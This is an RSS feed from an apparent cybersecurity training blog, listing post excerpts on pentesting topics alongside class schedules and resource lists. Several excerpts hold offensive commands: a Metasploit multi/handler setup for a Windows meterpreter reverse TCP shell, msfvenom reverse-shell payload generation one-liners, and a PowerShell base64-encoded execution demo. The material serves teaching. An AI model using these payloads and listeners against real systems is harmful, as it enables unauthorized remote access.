psh file: 3255 bytes Saved as: meterpreter-64.ps1 Setup listener msfconsole -x &amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34; Interact .</description></item><item><title>Msfvenom Cheatsheet</title><link>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</link><pubDate>Thu, 01 Apr 2021 16:11:01 +0530</pubDate><guid>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</guid><description>MSFVenom Cheatsheet Single Page Cheatsheet for common MSF Venom One Liners
Available in PDF, DOCX and Markdown format! PDF and DOCX versions contain the payload size in bytes and a few more commands.
MSFVenom Cheatsheet MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD &amp;ndash;list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.</description></item><item><title>Basic Linux</title><link>https://classroom.anir0y.in/post/excelr-basic-linux/</link><pubDate>Fri, 26 Mar 2021 20:24:44 +0530</pubDate><guid>https://classroom.anir0y.in/post/excelr-basic-linux/</guid><description>Overview Class Practical for Linux Basic Scripting
Hello {Name} #!/bin/bash echo &amp;#34;Hello, $1&amp;#34; Output bash hello.sh Mentor Hello Mentor Age Check #!/bin/bash #user-input echo -n &amp;#34;Enter Your Age: &amp;#34; read VAR #function if [[ $VAR -gt 21 ]] then echo &amp;#34;You&amp;#39;re Adult&amp;#34; else echo &amp;#34;Nope!&amp;#34; fi OutPut bash age.sh 19 Nope!</description></item><item><title>Ps Enc</title><link>https://classroom.anir0y.in/post/ps-enc/</link><pubDate>Thu, 25 Mar 2021 20:01:50 +0530</pubDate><guid>https://classroom.anir0y.in/post/ps-enc/</guid><description>Powershell Enc $pt=&amp;#39;echo &amp;#34;Hello $env:username&amp;#34;&amp;#39; $bytes=[System.Text.Encoding]::Unicode.GetBytes($pt) $enc=[Convert]::ToBase64String($bytes) $enc ZQBjAGgAbwAgACIASABlAGwAbABvACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAA== Run the encoded code powershell.exe -enc &amp;#34;ZQBjAGgAbwAgACIASABlAGwAbABvACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAA==&amp;#34;</description></item><item><title>Introduction to Vapt</title><link>https://classroom.anir0y.in/post/intro-vapt/</link><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/intro-vapt/</guid><description>Vulnerability Assessment and Penetration Testing (VAPT) Vulnerability Assessment and Penetration Testing (VAPT) are both security services that focus on identifying vulnerabilities in the network, server and system infrastructure. Both the services serves a different purpose and are carried out to achieve different but complimentary goals.
Vulnerability Assessment focuses on internal organizational security, while Penetration Testing focuses on external real-world risk.
What is Vulnerability Assessment (VA)? A Vulnerability Assessment is a rapid automated review of network devices, servers and systems to identify key vulnerabilities and configuration issues that an attacker may be able to take advantage off.</description></item><item><title>Phishing Attack</title><link>https://classroom.anir0y.in/post/blog2/</link><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/blog2/</guid><description>Overview: Even though the internet is one of the man’s great creation, but it has remained as a root cause for many cyber attacks. Let us discuss about cyber punk who is the root cause for many data breaches that has happened till date.
Phishing is a type of social engineering attack, where the attacker generally tries to impersonate as a legitimate person to get some sensitive credentials like [username, passwords, etc] of the target.</description></item><item><title>Vulnerable Apps, Servers, and Websites!</title><link>https://classroom.anir0y.in/post/blog1/</link><pubDate>Sun, 21 Mar 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/blog1/</guid><description>overview The following is a collection of vulnerable servers (VMs) or websites that you can use to practice your skills (sorted alphabetically).
Learning Platforms and VMs VulnHub Hack the Box TryHackMe eLearn Security PentesterLab bWAPP CloudGoat Damn Small Vulnerable Web Damn Vulnerable ARM Router (DVAR) Damn Vulnerable iOS Application (DVIA) Damn Vulnerable Web App (DVWA) Damn Vulnerable Web Services Damn Vulnerable WordPress DOMXSS Extreme Vulnerable Node Application(XVNA) Game of Hacks Gruyere Hack This Site Hack This Hack Yourself first Hackazon HellBound Hackers Kubernetes Goat Metasploitable2 Metasploitable3 Over The Wire Wargames OWASP Juice Shop OWASP Mutillidae II Peruggia PortSwigger Web Security Academy RootMe Samurai Web Testing Framework Server-Side Request Forgery (SSRF) vulnerable Lab Snyk exploit-workshop Try2Hack Vicnum Vulnerable Single Sign-On (SSO) Web Security Dojo WebGoat XXE Lab WebSploit Labs WebSploit Labs (created and maintained by Omar Ωr Santos) Mayhem - vulnerable container created by Omar Ωr for Mayhem 2020 RTOV-Hackme - vulnerable container created by Omar Ωr for DEF CON 27 RTV-Safemode - vulnerable container created by Omar Ωr for DEF CON Safemode</description></item><item><title>Volatility Installation in Linux</title><link>https://classroom.anir0y.in/post/vol2-installation/</link><pubDate>Wed, 17 Mar 2021 01:00:08 +0530</pubDate><guid>https://classroom.anir0y.in/post/vol2-installation/</guid><description>How to Install Volatility 2.6 in Kali Volatility is no longer packaged with new Kali releases, but can be manually installed.
┌──(kali㉿kali)-[~/volatility] └─$ vol.py Volatility Foundation Volatility Framework 2.6.1 *** Failed to import volatility.plugins.registry.shutdown (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.getservicesids (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.timeliner (ImportError: No module named Crypto.Hash) *** Failed to import volatility.plugins.malware.apihooks (NameError: name &amp;#39;distorm3&amp;#39; is not defined) *** Failed to import volatility.</description></item><item><title>Splunk Sysmon Configuration</title><link>https://classroom.anir0y.in/post/splunk-sysmon/</link><pubDate>Thu, 11 Mar 2021 01:45:35 +0530</pubDate><guid>https://classroom.anir0y.in/post/splunk-sysmon/</guid><description>Configure your Splunk Universal forwarder to send Sysmon logs to Splunk Okay locate your input.conf file and edit with your favorite text editor. It should be located somewhere similar to this
C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf and add the following
[WinEventLog://Microsoft-Windows-Sysmon/Operational] checkpointInterval = 5 current_only = 0 disabled = 0 start_from = oldest</description></item><item><title>Mobile App pentesting</title><link>https://classroom.anir0y.in/post/learnings-mobileapppt/</link><pubDate>Tue, 09 Mar 2021 21:23:59 +0530</pubDate><guid>https://classroom.anir0y.in/post/learnings-mobileapppt/</guid><description>Mobile Application Penetration Testing Cheat Sheet The Mobile App Pentest cheat sheet was created to provide concise collection of high value information on specific mobile application penetration testing topics and checklist, which is mapped OWASP Mobile Risk Top 10 for conducting pentest.
Mobile Application Security Testing Distributions All-in-one Mobile Security Frameworks Android Application Penetration Testing Reverse Engineering and Static Analysis Dynamic and Runtime Analysis Network Analysis and Server Side Testing Bypassing Root Detection and SSL Pinning Security Libraries iOS Application Penetration Testing Access Filesystem on iDevice Reverse Engineering and Static Analysis Dynamic and Runtime Analysis Network Analysis and Server Side Testing Bypassing Root Detection and SSL Pinning Security Libraries Mobile Penetration Testing Lab Contribution License Mobile Application Security Testing Distributions Appie - A portable software package for Android Pentesting and an awesome alternative to existing Virtual machines.</description></item><item><title>Keep Learning</title><link>https://classroom.anir0y.in/post/learnings/</link><pubDate>Tue, 09 Mar 2021 21:05:41 +0530</pubDate><guid>https://classroom.anir0y.in/post/learnings/</guid><description> Journey of a Pentester the starting point will be:
understanding of OS Networking (routing/protocols) useful during OPs pivoting reverse engineering (basic knowledge should do the job) Active Directory emails / exchange file/ application servers web applications. Freshers! start learning with pentesterlab.com Web Based Courses &amp;amp; Labs pentesteracademy.com Labs + course Testing your skills tryhackme.com Beginenr Friendly hackthebox.eu get your swags recommended Certs C|EH (Indian HRs loves it) OSCP CRTP OSWE</description></item><item><title>Free Certifications</title><link>https://classroom.anir0y.in/post/blog4/</link><pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/blog4/</guid><description>Free Certifications Curated list of free courses &amp;amp; certifications.
The offers on top of the table are time-limited and will expire soon. So, hurry up and grab them first!
Technology Provider Description Link Expiration Google Cloud Google One free month at Qwiklabs, Pluralsight &amp;amp; Coursera learning platforms. Pluralsight &amp;amp; Coursera require a credit card. Don’t forget to cancel in time. (Qwiklabs seem still to work.</description></item><item><title>Metasploit Cheat Sheet</title><link>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</link><pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</guid><description>Metasploit Cheat Sheet The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.
Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.
Metasploit : Search for module: msf &amp;gt; search [regex] Specify and exploit to use: msf &amp;gt; use exploit/[ExploitPath] Specify a Payload to use: msf &amp;gt; set PAYLOAD [PayloadPath] Show options for the current modules: msf &amp;gt; show options Set options: msf &amp;gt; set [Option] [Value] Start exploit: msf &amp;gt; exploit Useful Auxiliary Modules Port Scanner: msf &amp;gt; use auxiliary/scanner/portscan/tcp msf &amp;gt; set RHOSTS 10.</description></item><item><title>Awesome Powershell</title><link>https://classroom.anir0y.in/post/ref-powershell/</link><pubDate>Thu, 18 Feb 2021 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/ref-powershell/</guid><description>Awesome PowerShell A curated list of delightful PowerShell packages and resources.
PowerShell is a cross-platform (Windows, Linux, and macOS) automation and configuration tool that is optimized for dealing with structured data (e.g. JSON, CSV, XML, etc.), REST APIs, and object models. It includes a command-line shell and an associated scripting language.
Contents Awesome PowerShell Contents API Wrapper Blogs Books Build Tools Code and Package Repositories Commandline Productivity Communities Data Documentation Helper Editors and IDEs Frameworks Interactive Learning Logging Module Development Templates Package Managers Parallel Processing Podcasts Security SharePoint SQL Server Testing Themes UI Videos Webserver Misc API Wrapper HipChatAdmin - A module for simple integration with Atlassian HipChat via the HipChat API.</description></item><item><title>SmartKnowner: SEP Batch</title><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-sep/</link><pubDate>Sat, 12 Sep 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/2020-08-07-smartknowner-sep/</guid><description>Online Links Name Links One Note Online Agenda PDF WhatsApp Group Join For Any technical Help : classroom@anir0y.in For other Quries, please contact Support team. Progress Date Topic Tasks(optional) Status SEP 7 Introdution Day -01 Completed Sep 14 OS Day -02 Completed Sep 15 Info Sec Day -03 Completed Sep 17 Risk Management Day -04 Completed EOF EOF EOF EOF Topic Link IP address https://tools.</description></item><item><title>SmartKnowner: AUG Batch</title><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-aug/</link><pubDate>Wed, 12 Aug 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/2020-08-07-smartknowner-aug/</guid><description>+++ title = &amp;ldquo;SmartKnowner: AUG Batch! &amp;quot; description = &amp;ldquo;Smartknowner cybersecurity internship&amp;rdquo; tags = [ &amp;ldquo;Classroom&amp;rdquo;, &amp;ldquo;learning&amp;rdquo;, ] date= &amp;ldquo;12 Aug 2020&amp;rdquo; categories = [ &amp;ldquo;Classroom&amp;rdquo;, ] image = &amp;ldquo;fast-lane.jpg&amp;rdquo; +++
Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress [√]Session Start [√] Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [√] Minor Project : Download here [0] Major Project</description></item><item><title>Verzeo: JULY Batch</title><link>https://classroom.anir0y.in/post/2020-08-07-verzeo-aug/</link><pubDate>Wed, 12 Aug 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/2020-08-07-verzeo-aug/</guid><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress Session Start [0] Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [0] Minor Project [0] Major Project</description></item><item><title>SmartKnowner: JULY Batch</title><link>https://classroom.anir0y.in/post/2020-08-07-smartknowner-july/</link><pubDate>Sun, 12 Jul 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/2020-08-07-smartknowner-july/</guid><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf WhatsApp Group Join Here Progress Session Start Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking [0] Minor Project [0] Major Project</description></item><item><title>Verzeo JULY Batch</title><link>https://classroom.anir0y.in/post/2020-07-07-verzeo-july/</link><pubDate>Tue, 07 Jul 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/2020-07-07-verzeo-july/</guid><description>Hello, Links to our classroom will be available here. Name Links One Note Weblink Agenda download pdf One Drive Web Link Minor Project Download Progress Session Start Installation of VM Download VM Oracle Virtual Box Vmware OS download Kali Win7 ubuntu Networking Minor Project : Download [0] Major Project</description></item><item><title>Prequties for Training</title><link>https://classroom.anir0y.in/post/blog3/</link><pubDate>Wed, 01 Jan 2020 21:23:22 +0530</pubDate><guid>https://classroom.anir0y.in/post/blog3/</guid><description>Prerequisites As this is based on Basics of cyber security, so basic knowledge of computer and programming language (PHP,MySQL,Python) is a bonus. if you don’t know anything about these, you can learn the basic for free here
System requirements A laptop/Desktop with least 2MBPS internet connection. 50 GB of disk space 4 GB of RAM (min) any processor above i3 3rd generation.
OS recommendation As this is designed for entry level training.</description></item></channel></rss>